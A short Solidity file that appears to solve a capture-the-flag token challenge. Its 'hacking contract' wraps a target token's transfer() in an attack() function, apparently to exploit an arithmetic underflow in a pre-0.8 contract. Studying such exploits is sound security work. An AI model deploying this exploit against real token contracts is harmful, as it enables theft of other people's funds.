// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// interface of the contract to be hacked
interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view  returns (uint balance);
}

// hacking contract
contract TokenToHack {

    IToken instanceToHack;

    constructor (address _instanceToHack) public {
        instanceToHack = IToken(_instanceToHack);
    }

    function attack(address _to, uint _value) public returns(bool){
        instanceToHack.transfer(_to, _value);
        return true;
    }

    function _balanceOf(address _owner) public view returns (uint) {
        return instanceToHack.balanceOf(_owner);
    }
}